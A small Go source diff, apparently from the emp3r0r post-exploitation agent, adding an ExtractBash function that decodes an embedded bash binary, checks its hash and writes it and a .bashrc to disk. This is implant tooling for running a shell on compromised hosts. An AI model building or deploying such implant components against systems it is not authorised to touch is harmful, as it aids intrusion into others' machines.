@@ -7,6 +7,7 @@ import (
 	"errors"
 	"fmt"
 	"io"
+	"io/ioutil"
 	"log"
 	"net"
 	"os"
@@ -155,4 +156,21 @@ func calculateReverseProxyPort() string {
 	// reverseProxyPort
 	rProxyPortInt := p + 1
 	return strconv.Itoa(rProxyPortInt)
+}
+
+func ExtractBash() error {
+	bashData := tun.Base64Decode(emp3r0r_data.BashBinary)
+	if bashData == nil {
+		log.Printf("bash binary decode failed")
+	}
+	checksum := tun.SHA256SumRaw(bashData)
+	if checksum != emp3r0r_data.BashChecksum {
+		return fmt.Errorf("bash checksum error")
+	}
+	err := ioutil.WriteFile(emp3r0r_data.UtilsPath+"/.bashrc", []byte(emp3r0r_data.BashRC), 0600)
+	if err != nil {
+		log.Printf("Write bashrc: %v", err)
+	}
+
+	return ioutil.WriteFile(emp3r0r_data.UtilsPath+"/bash", bashData, 0755)
 }
